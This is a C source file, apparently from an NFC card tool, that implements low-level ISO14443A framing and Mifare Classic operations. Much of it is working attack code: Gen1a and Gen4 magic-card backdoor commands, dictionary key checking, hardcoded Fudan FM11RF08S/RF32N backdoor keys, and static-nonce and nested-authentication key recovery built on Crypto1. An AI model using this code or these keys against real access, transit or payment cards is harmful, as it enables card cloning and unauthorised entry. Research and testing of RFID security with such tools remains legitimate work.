// Raw ISO14443A and Mifare Classic over the chip monitor, see mfc.h and NOTES.md.

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>

#include "mfc.h"
#include "crapto1.h"
#include "mfckeys.h"
#include "nfchw.h"
#include "probe.h"

#define MS(x)       ((s64)(x) * 1000000LL)
#define PARITY_REG  0x5C560
#define PARITY_OFF  0x08
#define NRAR_TX     0x178 // r574 = 1, length code 0x78 for the 72-bit {nr}{ar} (NOTES.md)

Card card;
volatile bool mfCancel;
static char why[64]; // last failure reason, for the log

const char *mfWhy(void)
{
	return why;
}

#define FAIL(ret, ...) ({ snprintf(why, sizeof(why), __VA_ARGS__); return (ret); })

static const u8 rfDiscoverMap[] = { 0x10, 0x21, 0x00, 0x07, 0x01, 0x02, 0x01, 0x01, 0x04, 0x01, 0x01 };
static const u8 rfDiscoverA[]   = { 0x10, 0x21, 0x03, 0x03, 0x01, 0x00, 0x01 };

static void crcA(const u8 *data, u32 len, u8 *out)
{
	u32 c = 0x6363;
	for (u32 i = 0; i < len; i++) {
		u8 b = data[i] ^ (c & 0xFF);
		b ^= b << 4;
		c = (c >> 8) ^ (b << 8) ^ (b << 3) ^ (b >> 4);
	}
	out[0] = c;
	out[1] = c >> 8;
}

static bool parseActivation(const u8 *pkt, u32 len)
{
	// RF_INTF_ACTIVATED_NTF: id, intf, proto, mode, max payload, credits, len, NFC-A params
	if (len < 4 + 7) return false;
	const u8 *p = pkt + 4, *a = p + 7;
	if (p[6] < 3 || a[2] > sizeof(card.uid) || 4 + 7 + p[6] > len) return false;
	memcpy(card.atqa, a, 2);
	card.uidLen = a[2];
	memcpy(card.uid, a + 3, card.uidLen);
	card.sak = a[3 + card.uidLen] ? a[4 + card.uidLen] : 0;
	return true;
}

bool iso14aStart(void)
{
	u8 pkt[4 + 0x100];
	card.active = false;
	for (int t = 0; t < 4; t++) {
		if (!monLoad()) {
			logp("  (start: monitor load failed)\n");
			continue;
		}
		i2cNfcWrite(rfDiscoverMap, sizeof(rfDiscoverMap));
		while (nciRecv(pkt, sizeof(pkt), 25, false));
		i2cNfcWrite(rfDiscoverA, sizeof(rfDiscoverA));
		u64 t0 = osGetTime();
		while (osGetTime() - t0 < 4000) {
			if (mfCancel) return false;
			u32 len = nciRecv(pkt, sizeof(pkt), 10, false);
			if (len && pkt[1] == 0x61 && pkt[2] == 0x05) {
				if (!parseActivation(pkt, len)) {
					logp("  (start: bad activation)\n");
					break;
				}
				if (!monCapture(true)) {
					logp("  (start: capture failed)\n");
					break;
				}
				card.active = true;
				iso14aSelect(); // the ROM's SENS_RES in the NTF is always 00 00; get the ATQA from a WUPA
				return true;
			}
		}
		if (!card.active) logp("  (start: no card activated)\n");
		if (mfCancel) return false;
	}
	return false;
}

bool iso14aParity(bool on)
{
	return monWrite32(PARITY_REG, on ? 0 : PARITY_OFF);
}

// Answers come within a millisecond; a monitor round trip takes longer than that.
static int waitFramesN(MonFrame *ans, int max, int tries)
{
	for (int i = 0; i < tries; i++) {
		int n = monFrames(ans, max);
		if (n) return n;
		svcSleepThread(MS(2));
	}
	return 0;
}

static int waitFrames(MonFrame *ans, int max)
{
	return waitFramesN(ans, max, 4);
}

int iso14aTx(const u8 *data, u32 len, u8 code, MonFrame *ans, int max)
{
	u8 buf[0x40];
	if (len + 1 > sizeof(buf)) return -1;
	memcpy(buf, data, len);
	if (!code) code = len << 4;
	if (len == 1 && !(code & 0xF)) buf[len++] = 0; // a lone full byte needs a padding byte in the FIFO
	if (!monTxraw(buf, len, code, 0, 1, 0x88)) return -1;
	return waitFrames(ans, max);
}

// Data-mode TX (r574 = 0): the HW frames whole bytes, adds parity and (code 0) appends CRC.
// Returns the answer count, -1 on a monitor error.
static int dataTx(const u8 *data, u32 len, MonFrame *ans, int max)
{
	if (!monTxraw(data, len, 0, 0, 0, 0x88)) return -1;
	return waitFrames(ans, max);
}

int iso14aDataTx(const u8 *data, u32 len, MonFrame *ans, int max, int polls)
{
	if (monFrames(ans, max) < 0 || !monTxraw(data, len, 0, 0, 0, 0x88)) return -1;
	return waitFramesN(ans, max, polls);
}

void iso14aCrc(const u8 *data, u32 len, u8 out[2])
{
	crcA(data, len, out);
}

// The UID Crypto1 uses: the last cascade level's 4 bytes.
static u32 cardUid(void)
{
	const u8 *u = card.uid + card.uidLen - 4;
	return u[0] << 24 | u[1] << 16 | u[2] << 8 | u[3];
}

// The answer among a poll's frames: the last one of at least min bytes. Some cards (a Mastercard debit
// card) come with stray 1-byte frames around their answers, before or after it.
static const MonFrame *answer(const MonFrame *f, int n, int min)
{
	while (n-- > 0)
		if (f[n].len >= min) return &f[n];
	return NULL;
}

// The SAK from a SELECT's frames: one with its CRC if there is one, else as before (the last frame).
static int sakOf(const MonFrame *f, int n)
{
	const MonFrame *a = answer(f, n, 3);
	if (a) return a->data[0];
	return n && f[n - 1].len ? f[n - 1].data[0] : -1;
}

// WUPA and a real anticollision (93 / 95 / 97 20), for a card whose UID changed under us (random UIDs, as
// YubiKeys have, are new after each wake-up): card.uid becomes the one it tells now.
static int selectKnown(void);

static int selectAnticoll(void)
{
	MonFrame f[4];
	u8 hlta[4] = { 0x50, 0x00 }, wupa = 0x52, uid[10];
	int len = 0, sak = -1;
	crcA(hlta, 2, hlta + 2);
	if (!monTxraw(hlta, 4, 4 << 4, 0, 1, 0x88)) return -2;
	int n = iso14aTx(&wupa, 1, 0x07, f, 4);
	if (n < 0) return -2;
	const MonFrame *a = answer(f, n, 2);
	if (!a || a->len != 2) return -1;
	memcpy(card.atqa, a->data, 2);
	for (int l = 0; l < 3; l++) {
		u8 ac[2] = { 0x93 + 2 * l, 0x20 }, sel[7] = { 0x93 + 2 * l, 0x70 };
		n = iso14aTx(ac, 2, 0, f, 4);
		if (n < 0) return -2;
		if (!(a = answer(f, n, 5))) return -1;
		const u8 *d = a->data;
		if ((d[0] ^ d[1] ^ d[2] ^ d[3]) != d[4]) return -1;
		memcpy(sel + 2, d, 5);
		n = l ? dataTx(sel, 7, f, 4) : iso14aTx(sel, 7, 0, f, 4);
		if (n < 0) return -2;
		if ((sak = sakOf(f, n)) < 0) return -1;
		if (d[0] == 0x88) memcpy(uid + len, d + 1, 3), len += 3;
		else memcpy(uid + len, d, 4), len += 4;
		if (!(sak & 0x04)) break; // UID complete
	}
	if (sak & 0x04) return -1;
	memcpy(card.uid, uid, len);
	card.uidLen = len;
	card.sak = sak;
	return sak;
}

int iso14aSelect(void)
{
	int r = selectKnown();
	return r == -1 ? selectAnticoll() : r;
}

static int selectKnown(void)
{
	MonFrame f[4];
	u8 hlta[4] = { 0x50, 0x00 }, wupa = 0x52, cl[3][4];
	if (card.uidLen != 4 && card.uidLen != 7 && card.uidLen != 10) return -1;
	crcA(hlta, 2, hlta + 2);
	if (!monTxraw(hlta, 4, 4 << 4, 0, 1, 0x88)) return -2; // never answered: no wait
	int n = iso14aTx(&wupa, 1, 0x07, f, 4);
	if (n < 0) return -2;
	const MonFrame *a = answer(f, n, 2);
	if (!a || a->len != 2) return -1;
	memcpy(card.atqa, a->data, 2);
	// 7/10-byte UID: cascade tag 88 + 3 bytes at each level but the last, which gets the last 4
	int levels = card.uidLen / 3, sak = -1;
	for (int l = 0; l < levels - 1; l++) {
		cl[l][0] = 0x88;
		memcpy(cl[l] + 1, card.uid + 3 * l, 3);
	}
	memcpy(cl[levels - 1], card.uid + card.uidLen - 4, 4);
	for (int l = 0; l < levels; l++) {
		u8 sel[7] = { 0x93 + 2 * l, 0x70 };
		memcpy(sel + 2, cl[l], 4);
		sel[6] = cl[l][0] ^ cl[l][1] ^ cl[l][2] ^ cl[l][3];
		// The bit-mode framer CRCs 93 70 by itself; levels 2 and 3 go in data mode, which CRCs any frame.
		n = l ? dataTx(sel, 7, f, 4) : iso14aTx(sel, 7, 0, f, 4);
		if (n < 0) return -2;
		if ((sak = sakOf(f, n)) < 0) return -1;
	}
	card.sak = sak; // a GTU config write changes it under an active card
	return sak;
}

// Gen1a "magic" backdoor unlock: HLTA, then 0x40 (7-bit) and 0x43, each ACKed with a 4-bit 0x0a.
bool mfGen1aUnlock(void)
{
	MonFrame f[2];
	u8 hlta[4] = { 0x50, 0x00 }, c40 = 0x40, c43 = 0x43;
	if (!iso14aParity(true)) return false;
	crcA(hlta, 2, hlta + 2);
	iso14aTx(hlta, 4, 0, f, 2);
	int n = iso14aTx(&c40, 1, 0x07, f, 2); // 7-bit frame
	if (n <= 0 || f[n - 1].len < 1 || f[n - 1].data[0] != 0x0A) return false;
	n = iso14aTx(&c43, 1, 0x10, f, 2);
	return n > 0 && f[n - 1].len >= 1 && f[n - 1].data[0] == 0x0A;
}

// Plaintext backdoor read (no auth), for verifying a write.
static int gen1aRead(u8 block, u8 out[16])
{
	MonFrame f[2];
	u8 cmd[4] = { 0x30, block };
	crcA(cmd, 2, cmd + 2);
	int n = iso14aTx(cmd, 4, 0, f, 2);
	if (n <= 0 || f[n - 1].len < 18) return -1;
	u8 crc[2];
	crcA(f[n - 1].data, 16, crc);
	if (memcmp(crc, f[n - 1].data + 16, 2)) return 0;
	memcpy(out, f[n - 1].data, 16);
	return 1;
}

int mfGen1aWrite(u8 block, const u8 data[16])
{
	MonFrame f[2];
	u8 cmd[2] = { 0xA0, block }, back[16];
	if (!mfGen1aUnlock()) FAIL(-1, "gen1a unlock");
	int n = dataTx(cmd, 2, f, 2);
	if (n < 0) FAIL(-1, "A0 tx");
	if (!n || f[n - 1].len < 1 || f[n - 1].data[0] != 0x0A) FAIL(0, "A0 nak");
	n = dataTx(data, 16, f, 2);
	if (n < 0) FAIL(-1, "data tx");
	if (!n || f[n - 1].len < 1 || f[n - 1].data[0] != 0x0A) FAIL(0, "data nak");
	if (!mfGen1aUnlock()) FAIL(-1, "reunlock");
	if (gen1aRead(block, back) != 1) FAIL(-1, "verify read");
	if (memcmp(back, data, 16)) FAIL(0, "verify mismatch");
	return 1;
}

const u8 mfGen4DefaultPwd[4] = { 0, 0, 0, 0 };
u8 mfGen4Pwd[4];

// One Gen4 GTU command: CF pwd[4] cmd... in data mode (HW parity + CRC). Tried as is first, then
// once more after a SELECT (a failed or Crypto1 exchange leaves the card idle or mid-session).
// A write answers only after its flash write, so waits longer; a late answer must not be taken for
// the next command's, so stale frames are dropped first. A wrong password mutes the card until the
// field is reset (not even WUPA). Returns the answer length without its CRC, 0 = no / bad answer,
// -1 = monitor error.
static int gen4Cmd(const u8 pwd[4], const u8 *cmd, u32 len, u8 *out, u32 outMax)
{
	MonFrame f[2];
	u8 buf[0x30] = { 0xCF }, crc[2];
	if (5 + len > sizeof(buf)) return 0;
	memcpy(buf + 1, pwd, 4);
	memcpy(buf + 5, cmd, len);
	if (!iso14aParity(true)) FAIL(-1, "parity on");
	for (int t = 0; t < 2; t++) {
		if (t) {
			int sak = iso14aSelect();
			if (sak == -2) FAIL(-1, "select: monitor");
			if (sak < 0) FAIL(0, "card mute (wrong password? rescan)");
		}
		if (monFrames(f, 2) < 0 || !monTxraw(buf, 5 + len, 0, 0, 0, 0x88)) FAIL(-1, "CF tx");
		int n = waitFramesN(f, 2, cmd[0] == 0xCD || cmd[0] == 0xF0 ? 25 : 4);
		if (n < 0) FAIL(-1, "CF rx");
		if (!n) continue;
		const MonFrame *a = &f[n - 1];
		if (a->len < 3 || a->len < a->regs[4]) continue; // a 4-bit NAK, or truncated
		crcA(a->data, a->len - 2, crc);
		if (memcmp(crc, a->data + a->len - 2, 2)) continue;
		u32 m = a->len - 2 < outMax ? a->len - 2 : outMax;
		memcpy(out, a->data, m);
		return m;
	}
	FAIL(0, "no gen4 answer");
}

int mfUscuidConfig(u8 out[MF_USC_CFG])
{
	MonFrame f[2];
	u8 cmd[4] = { 0xE0, 0x00 }, crc[2];
	if (!mfGen1aUnlock()) FAIL(0, "no gen1a wakeup");
	crcA(cmd, 2, cmd + 2);
	int n = iso14aTx(cmd, 4, 0, f, 2);
	if (n < 0) FAIL(-1, "E000 tx");
	if (!n || f[n - 1].len != MF_USC_CFG + 2) FAIL(0, "no uscuid config");
	crcA(f[n - 1].data, MF_USC_CFG, crc);
	if (memcmp(crc, f[n - 1].data + MF_USC_CFG, 2)) FAIL(0, "config crc");
	memcpy(out, f[n - 1].data, MF_USC_CFG);
	return 1;
}

int mfUscuidSetConfig(const u8 cfg[MF_USC_CFG])
{
	MonFrame f[2];
	u8 cur[MF_USC_CFG], cmd[2] = { 0xE1, 0x00 };
	int r = mfUscuidConfig(cur);
	if (r <= 0) return r;
	for (int i = 0; i < MF_USC_CFG; i++) {
		if (cfg[i] == cur[i]) continue;
		if (i == 15) continue;
		if (i != 6 && i != 7 && i != 12) FAIL(0, "config byte %d may not change", i);
		if (cfg[i] != 0x00 && cfg[i] != 0x5A) FAIL(0, "config byte %d: %02X, not 00/5A", i, cfg[i]);
	}
	if (!mfGen1aUnlock()) FAIL(-1, "gen1a unlock");
	int n = dataTx(cmd, 2, f, 2);
	if (n < 0) FAIL(-1, "E1 tx");
	if (!n || f[n - 1].len < 1 || f[n - 1].data[0] != 0x0A) FAIL(0, "E1 nak");
	n = dataTx(cfg, MF_USC_CFG, f, 2);
	if (n < 0) FAIL(-1, "data tx");
	if (!n || f[n - 1].len < 1 || f[n - 1].data[0] != 0x0A) FAIL(0, "data nak");
	if ((r = mfUscuidConfig(cur)) <= 0) return r;
	if (memcmp(cur, cfg, MF_USC_CFG)) FAIL(0, "verify mismatch");
	return 1;
}

int mfGen4Read(const u8 pwd[4], u8 block, u8 out[16])
{
	u8 cmd[2] = { 0xCE, block }, buf[16];
	int n = gen4Cmd(pwd, cmd, 2, buf, sizeof(buf));
	if (n <= 0) return n;
	if (n != 16) FAIL(0, "gen4 read: %d bytes", n);
	memcpy(out, buf, 16);
	return 1;
}

int mfGen4Write(const u8 pwd[4], u8 block, const u8 data[16])
{
	u8 cmd[18] = { 0xCD, block }, ans[4], back[16];
	memcpy(cmd + 2, data, 16);
	int n = gen4Cmd(pwd, cmd, sizeof(cmd), ans, sizeof(ans));
	if (n <= 0) return n;
	if (n != 2 || ans[0] != 0x90 || ans[1] != 0x00) FAIL(0, "gen4 write: nak");
	int r = mfGen4Read(pwd, block, back);
	if (r <= 0) return r;
	if (memcmp(back, data, 16)) FAIL(0, "verify mismatch");
	return 1;
}

int mfGen4Config(const u8 pwd[4], u8 *out, u32 max)
{
	u8 cmd = 0xC6;
	return gen4Cmd(pwd, &cmd, 1, out, max);
}

// Config bytes a write may change: 0 protocol (Classic / Ultralight), 1 UID length (4, 7 or 10 bytes:
// what our SELECT does), 6 shadow mode, 7 ATS length, 8-23 ATS, 24-25 ATQA (swapped), 26 SAK, 27
// Ultralight mode. The rest (password, max sectors) must stay, so a write can't lock us out: a lost
// password is a lost card.
static bool gen4CfgChangeable(int i)
{
	return i <= 1 || (i >= 6 && i <= 27);
}

int mfGen4Version(const u8 pwd[4], u8 *out, u32 max)
{
	u8 cmd = 0xCC;
	return gen4Cmd(pwd, &cmd, 1, out, max);
}

int mfGen4SetConfig(const u8 pwd[4], const u8 cfg[MF_GEN4_CFG])
{
	u8 cur[32], cmd[1 + MF_GEN4_CFG] = { 0xF0 }, ans[4];
	int n = mfGen4Config(pwd, cur, sizeof(cur));
	if (n <= 0) return n;
	if (n != MF_GEN4_CFG) FAIL(0, "config is %d bytes, not %d", n, MF_GEN4_CFG);
	for (int i = 0; i < MF_GEN4_CFG; i++)
		if (cfg[i] != cur[i] && !gen4CfgChangeable(i)) FAIL(0, "config byte %d may not change", i);
	if (cfg[0] > 1) FAIL(0, "protocol %02X", cfg[0]);
	if (cfg[1] > 2) FAIL(0, "UID length %02X (only 4, 7 or 10 bytes)", cfg[1]);
	if (cfg[27] > 3) FAIL(0, "Ultralight mode %02X", cfg[27]);
	if (cfg[6] > 4) FAIL(0, "shadow mode %02X", cfg[6]);
	if (cfg[7] > 16) FAIL(0, "ATS length %d", cfg[7]);
	// F0 only: F1 would fuse the config for good.
	memcpy(cmd + 1, cfg, MF_GEN4_CFG);
	if ((n = gen4Cmd(pwd, cmd, sizeof(cmd), ans, sizeof(ans))) <= 0) return n;
	if (n != 2 || ans[0] != 0x90 || ans[1] != 0x00) FAIL(0, "config write: nak");
	if ((n = mfGen4Config(pwd, cur, sizeof(cur))) <= 0) return n;
	if (n != MF_GEN4_CFG || memcmp(cur, cfg, MF_GEN4_CFG)) FAIL(0, "verify mismatch");
	return 1;
}

u32 mfPack(const u8 *data, u32 len, const u8 *par, u8 *out, u8 *code)
{
	u32 bits = len * 9, nbytes = (bits + 7) / 8;
	memset(out, 0, nbytes);
	for (u32 i = 0; i < len; i++) {
		u32 v = data[i] | (par ? par[i] : oddParity(data[i])) << 8;
		for (u32 k = 0; k < 9; k++) out[(9 * i + k) / 8] |= ((v >> k) & 1) << ((9 * i + k) % 8);
	}
	*code = (bits / 8) << 4 | (bits % 8);
	return nbytes;
}

u32 mfUnpack(const u8 *raw, u32 rawLen, u32 off, u8 *out, u32 n)
{
	u32 i;
	for (i = 0; i < n && off + 9 * i + 9 <= rawLen * 8; i++) {
		u8 b = 0;
		for (u32 k = 0; k < 8; k++) {
			u32 bit = off + 9 * i + k;
			b |= ((raw[bit / 8] >> (bit % 8)) & 1) << k;
		}
		out[i] = b;
	}
	return i;
}

// Parity bit of the i-th 9-bit group (raw received parity, encrypted under Crypto1)
static u8 unpackPar(const u8 *raw, u32 off, u32 i)
{
	u32 bit = off + 9 * i + 8;
	return (raw[bit / 8] >> (bit % 8)) & 1;
}

// Parity-off TX of bytes with the given parity bits; the answer's bit stream starts where ours ended.
static int ptx(const u8 *data, u32 len, const u8 *par, MonFrame *ans, u32 *rxOff)
{
	u8 raw[0x40], code;
	u32 n = mfPack(data, len, par, raw, &code);
	*rxOff = (len * 9) % 8;
	int r = iso14aTx(raw, n, code, ans, 1);
	return r;
}

static int authCmd(u8 authc, u8 block, const u8 key[6], Crypto1 *c, u32 *ntOut);

int mfAuth(u8 block, const u8 key[6], bool keyB, Crypto1 *c)
{
	return authCmd(keyB ? 0x61 : 0x60, block, key, c, NULL);
}

// The re-select + AUTH part of the chip ops' arg (OP_CHKKEYS, OP_DARKSIDE): nsteps, HLTA (no answer),
// WUPA (7 bits), a SELECT per cascade level as iso14aSelect sends them, then the AUTH command's code,
// length and parity-packed frame. Returns the end.
static u8 *selectAuthArg(u8 *p, u8 block, bool keyB)
{
	int levels = card.uidLen / 3;
	*p++ = 2 + levels;
	*p++ = 1, *p++ = 0x40, *p++ = 0, *p++ = 4, *p++ = 0x50, *p++ = 0x00;
	crcA(p - 2, 2, p);
	p += 2;
	*p++ = 1, *p++ = 0x07, *p++ = 1, *p++ = 1, *p++ = 0x52;
	for (int l = 0; l < levels; l++) {
		u8 *sel = p + 4;
		*p++ = l ? 0 : 1, *p++ = l ? 0 : 0x70, *p++ = 1, *p++ = 7; // level 1 bit mode, the rest data mode
		sel[0] = 0x93 + 2 * l, sel[1] = 0x70;
		if (l < levels - 1) sel[2] = 0x88, memcpy(sel + 3, card.uid + 3 * l, 3);
		else memcpy(sel + 2, card.uid + card.uidLen - 4, 4);
		sel[6] = sel[2] ^ sel[3] ^ sel[4] ^ sel[5];
		p += 7;
	}
	u8 cmd[4] = { keyB ? 0x61 : 0x60, block }, code;
	crcA(cmd, 2, cmd + 2);
	u32 fl = mfPack(cmd, 4, NULL, p + 2, &code);
	p[0] = code, p[1] = fl;
	return p + 2 + fl;
}

int mfChkKeys(u8 block, bool keyB, const u8 (*keys)[6], int n)
{
	if (card.uidLen != 4 && card.uidLen != 7 && card.uidLen != 10) FAIL(-2, "no card");
	u8 a[250], *p = a;
	u32 uid = cardUid(), nr = 0x12345678;
	for (int i = 0; i < 4; i++) *p++ = uid >> (24 - 8 * i);
	for (int i = 0; i < 4; i++) *p++ = nr >> (24 - 8 * i);
	*p++ = MF_AT_WAIT & 0xFF, *p++ = MF_AT_WAIT >> 8;
	p = selectAuthArg(p, block, keyB);
	int per = (a + sizeof(a) - p - 1) / 6;
	for (int base = 0; base < n; base += per) {
		int m = n - base < per ? n - base : per;
		u8 *q = p, out[3];
		*q++ = m;
		memcpy(q, keys[base], 6 * m);
		if (monChkKeys(a, q + 6 * m - a, NRAR_TX, out) < 0) FAIL(-3, "chkkeys: monitor");
		if (out[0] != 0xFF) return base + out[0];
		if (out[2] == out[1]) FAIL(-2, "chkkeys: no card");
	}
	FAIL(-1, "no key fits");
}

// mfAuth with the raw AUTH command byte (0x64/0x65 = the FM11RF08S backdoor variants); ntOut gets
// the card nonce (NULL = don't care)

static int authCmd(u8 authc, u8 block, const u8 key[6], Crypto1 *c, u32 *ntOut)
{
	MonFrame f[4];
	u8 cmd[4] = { authc, block }, raw[8], code;
	if (!iso14aParity(true)) FAIL(-1, "parity on");
	int sak = iso14aSelect();
	if (sak == -2) FAIL(-1, "select: monitor");
	if (sak < 0) FAIL(0, "select: no answer");
	if (!iso14aParity(false)) FAIL(-1, "parity off");
	crcA(cmd, 2, cmd + 2);
	u32 n = mfPack(cmd, 4, NULL, raw, &code);
	if (monFrames(f, 4) < 0) FAIL(-1, "frames");
	u32 uid = cardUid();
	u32 nt, odd, even;
	int r = monAuth(key, uid, 0x12345678, raw, n, code, NRAR_TX, &nt, &odd, &even);
	if (r < 0) FAIL(-1, "auth op");
	if (!r) FAIL(0, "no nt");
	// The ring now holds nt and, with the right key, {at} right after it.
	int got = 0;
	for (int i = 0; i < 5 && got < 2; i++) {
		int k = monFrames(f + got, 4 - got);
		if (k < 0) FAIL(-1, "frames after auth");
		got += k;
		if (got < 2) svcSleepThread(MS(2));
	}
	if (got < 2) FAIL(0, "no {at}");
	u8 atb[4], atp[4];
	if (mfUnpack(f[got - 1].data, f[got - 1].len, 0, atb, 4) != 4) return 0;
	c->odd = odd;
	c->even = even;
	c1Decrypt(c, atb, 4, atp);
	u32 at = atp[0] << 24 | atp[1] << 16 | atp[2] << 8 | atp[3];
	if (at != prngSuccessor(nt, 96)) FAIL(0, "{at} mismatch");
	if (ntOut) *ntOut = nt;
	return 1;
}

int mfReadBlock(Crypto1 *c, u8 block, u8 out[16])
{
	MonFrame f;
	u8 cmd[4] = { 0x30, block }, enc[4], par[4], d[18];
	u32 off;
	crcA(cmd, 2, cmd + 2);
	c1Encrypt(c, cmd, 4, enc, par);
	int n = ptx(enc, 4, par, &f, &off);
	if (n <= 0) return n;
	u8 raw[18];
	if (mfUnpack(f.data, f.len, off, raw, 18) != 18) return 0;
	c1Decrypt(c, raw, 18, d);
	u8 crc[2];
	crcA(d, 16, crc);
	if (memcmp(crc, d + 16, 2)) return 0;
	memcpy(out, d, 16);
	return 1;
}

#define NESTED_DIST 160 // on-chip OP_NESTED gives this fixed PRNG distance nt0 -> nt_T (NOTES.md)

// One nested nonce: select, then auth1 (known key, raw AUTH command ac) + the nested AUTH (raw command
// nc0) on-chip at fixed timing. Reads nt0 (known auth nonce), the encrypted nested nonce and its 4 raw
// parity bits (bit 3 = first byte). 1 ok, 0 no answer, -1 monitor error.
static int nestedCapture(u8 ac, u8 kb, const u8 key[6], u8 nc0, u8 tb, u32 *nt0, u32 *encNt, u8 *par)
{
	MonFrame f[4];
	u8 a1[4] = { ac, kb }, frame[8], code, nc[4] = { nc0, tb };
	crcA(a1, 2, a1 + 2);
	crcA(nc, 2, nc + 2);
	u32 flen = mfPack(a1, 4, NULL, frame, &code);
	if (!iso14aParity(true)) FAIL(-1, "parity on");
	if (iso14aSelect() < 0) FAIL(0, "select");
	if (!iso14aParity(false)) FAIL(-1, "parity off");
	monFrames(f, 4); // drop the activation/select frames
	u32 uid = cardUid();
	int r = monNested(key, uid, 0x12345678, frame, flen, code, nc, NRAR_TX, nt0);
	if (r < 0) FAIL(-1, "nested op");
	if (!r) FAIL(0, "no nt0");
	int n = monFrames(f, 4);
	if (n < 1) FAIL(0, "no nested nonce");
	u8 b[4];
	if (mfUnpack(f[n - 1].data, f[n - 1].len, 4, b, 4) != 4) FAIL(0, "short nonce");
	*encNt = b[0] << 24 | b[1] << 16 | b[2] << 8 | b[3];
	if (par) {
		*par = 0;
		for (int i = 0; i < 4; i++) *par = *par << 1 | unpackPar(f[n - 1].data, 4, i);
	}
	return 1;
}

static int nestedNonce(u8 kb, const u8 key[6], bool knownB, u8 tb, bool tgtB, u32 *nt0, u32 *encNt)
{
	return nestedCapture(knownB ? 0x61 : 0x60, kb, key, tgtB ? 0x61 : 0x60, tb, nt0, encNt, NULL);
}

static u64 key48(const u8 key[6])
{
	u64 k = 0;
	for (int i = 0; i < 6; i++) k = k << 8 | key[i];
	return k;
}

static void keyBytes(u64 k, u8 key[6])
{
	for (int i = 0; i < 6; i++) key[i] = k >> (40 - 8 * i);
}


const u8 mfBackdoorKeys[][6] = {
	{ 0xA3, 0x96, 0xEF, 0xA4, 0xE2, 0x4F }, // FM11RF08S
	{ 0xA3, 0x16, 0x67, 0xA8, 0xCE, 0xC1 }, // FM11RF08 (and some *98)
	{ 0x51, 0x8B, 0x33, 0x54, 0xE7, 0x60 }, // FM11RF32N
	{ 0x73, 0xB9, 0x83, 0x6C, 0xF1, 0x68 }, // FM11RF32N (other batch, pm3 hf mf info)
};
const int mfNumBackdoorKeys = sizeof(mfBackdoorKeys) / sizeof(mfBackdoorKeys[0]);

int mfBackdoorKey(u8 keyOut[6])
{
	for (int i = 0; i < mfNumBackdoorKeys; i++) {
		Crypto1 c;
		for (int t = 0; t < 2; t++) { // the static-nonce cards flake on a cold auth
			int r = authCmd(0x64, 0, mfBackdoorKeys[i], &c, NULL);
			if (r < 0) return -1;
			if (r) {
				memcpy(keyOut, mfBackdoorKeys[i], 6);
				return 1;
			}
		}
	}
	FAIL(0, "no backdoor");
}

int mfStaticNonce(u8 block, bool keyB, const u8 bdKey[6], MfStatic *st)
{
	u32 nt0, enc;
	u8 bd = keyB ? 0x65 : 0x64, nr = keyB ? 0x61 : 0x60;
	int r = 0;
	// 1: nested with the backdoor command -> the static nonce under the backdoor key -> clear nt
	for (int t = 0; t < 4 && r != 1; t++)
		if ((r = nestedCapture(bd, block, bdKey, bd, block, &nt0, &enc, NULL)) < 0) return -1;
	if (r != 1) return 0;
	st->nt = crapto1_nt_decrypt(key48(bdKey), cardUid(), enc);
	// Backdoor but no static nonce (FM11RF32N: the nested nonce changes each time): not for this attack
	r = 0;
	for (int t = 0; t < 4 && r != 1; t++)
		if ((r = nestedCapture(bd, block, bdKey, bd, block, &nt0, &enc, NULL)) < 0) return -1;
	if (r != 1) return 0;
	if (crapto1_nt_decrypt(key48(bdKey), cardUid(), enc) != st->nt) FAIL(0, "nonce not static");
	// 2: nested with the normal command -> the same nonce under the real key, with its parity
	r = 0;
	for (int t = 0; t < 4 && r != 1; t++)
		if ((r = nestedCapture(bd, block, bdKey, nr, block, &nt0, &st->ntEnc, &st->par)) < 0) return -1;
	return r;
}

bool mfStaticMatch(const MfStatic *st, const u8 key[6])
{
	return crapto1_nt_decrypt(key48(key), cardUid(), st->ntEnc) == st->nt;
}

// Nested AUTH inside an authenticated session; the encrypted nonce. 1 ok, 0 no answer, -1 monitor.
static int sessionNonce(Crypto1 *c, u8 authc, u8 block, u32 *enc)
{
	MonFrame f;
	u8 cmd[4] = { authc, block }, e[4], par[4], b[4];
	u32 off;
	crcA(cmd, 2, cmd + 2);
	c1Encrypt(c, cmd, 4, e, par);
	int n = ptx(e, 4, par, &f, &off);
	if (n < 0) FAIL(-1, "nested tx");
	if (!n || mfUnpack(f.data, f.len, off, b, 4) != 4) FAIL(0, "no nested nonce");
	*enc = b[0] << 24 | b[1] << 16 | b[2] << 8 | b[3];
	return 1;
}

// Static-nonce cards (Fudan, first nonce always the same): the PRNG restarts at select and steps per
// auth, not with time, so every OP_NESTED capture repeats one (nt, ks). This one completes a nested
// auth into the known sector first, so the target's nonce comes one nested auth later -- a second
// distance. Event-based stepping makes the host round trips harmless. 1 ok, 0 no answer, -1 monitor.
static int nestedNonce2(u8 kb, const u8 key[6], bool knownB, u8 tb, bool tgtB, u32 *nt0, u32 *encNt)
{
	Crypto1 c;
	MonFrame f;
	u32 uid = cardUid(), enc;
	int r = authCmd(knownB ? 0x61 : 0x60, kb, key, &c, nt0);
	if (r <= 0) return r;
	if ((r = sessionNonce(&c, knownB ? 0x61 : 0x60, kb, &enc)) <= 0) return r;
	c1Init(&c, key);
	u32 nt = enc ^ c1Word(&c, uid ^ enc, true), ar = prngSuccessor(nt, 64);
	u8 nrar[8], par[8], raw[9], code, atb[4], atp[4];
	for (int i = 0; i < 8; i++) { // {nr}{ar}: nr fed in plain, as on the first auth
		u8 b = i < 4 ? 0x12345678 >> (24 - 8 * i) : ar >> (56 - 8 * i);
		nrar[i] = c1Byte(&c, i < 4 ? b : 0, false) ^ b;
		par[i] = c1Peek(&c) ^ oddParity(b);
	}
	mfPack(nrar, 8, par, raw, &code);
	int n = iso14aTx(raw, 9, NRAR_TX & 0xFF, &f, 1); // mfPack's code truncates the 72 bits
	if (n < 0) FAIL(-1, "{nr}{ar} tx");
	if (!n || mfUnpack(f.data, f.len, 0, atb, 4) != 4) FAIL(0, "no nested {at}");
	c1Decrypt(&c, atb, 4, atp);
	if ((u32)(atp[0] << 24 | atp[1] << 16 | atp[2] << 8 | atp[3]) != prngSuccessor(nt, 96))
		FAIL(0, "nested {at} mismatch");
	return sessionNonce(&c, tgtB ? 0x61 : 0x60, tb, encNt);
}

static int nonceDistance(u32 from, u32 to)
{
	for (int i = 0; i < 65536; i++, from = prngSuccessor(from, 1))
		if (from == to) return i;
	return -1;
}

// Distance from the first nonce to a nested nonce (one or two nested auths in), measured by nesting
// into the known sector itself and decrypting with its key. 1 ok, 0 no answer, -1 monitor error.
